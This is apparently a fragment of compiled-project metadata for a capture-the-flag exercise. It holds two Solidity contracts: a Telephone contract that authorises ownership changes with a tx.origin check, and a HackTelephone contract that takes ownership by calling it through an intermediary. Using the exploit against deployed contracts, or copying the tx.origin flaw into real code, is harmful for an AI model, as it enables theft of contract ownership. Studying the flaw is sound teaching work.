pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "./Telephone.sol";

contract HackTelephone {

  Telephone public telephone;

  constructor(address _telephone) public {
    telephone = Telephone(_telephone);
  }

  function getOwnership() public {

    telephone.changeOwner(msg.sender);
    console.log("msg sender = %s ",msg.sender);
  }
}
","keccak256":"0x8d21f5f89944ea0b85401840e81310fa391ce72010136c7065597c3e3e855989","license":"MIT"},"contracts/Telephone.sol":{"content":"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
    console.log("Owner = %s", owner);
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
      console.log("Tx.origin = %s and msg.sender = %s", tx.origin, msg.sender);
    }
  }
}
